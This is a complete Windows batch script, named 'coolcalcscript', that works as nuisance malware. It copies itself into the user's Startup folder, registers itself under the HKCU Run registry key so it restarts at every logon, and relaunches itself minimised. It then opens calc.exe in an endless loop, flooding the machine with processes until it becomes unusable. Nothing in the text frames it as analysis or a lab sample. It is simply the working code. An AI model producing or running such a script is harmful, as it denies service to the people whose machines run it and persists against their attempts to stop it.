@echo off
setlocal

set "SCRIPT=%~f0"
set "NAME=coolcalcscript"
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "DEST=%STARTUP%\%NAME%.bat"

if not exist "%DEST%" (
    copy "%SCRIPT%" "%DEST%" >nul 2>&1
)

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
/v "%NAME%" ^
/t REG_SZ ^
/d "\"%SCRIPT%\"" ^
/f >nul

if not "%1"=="hidden" (
    start "" /min "%~f0" hidden
    exit
)

:loop
start "" "%SystemRoot%\System32\calc.exe"
goto loop

endlocal
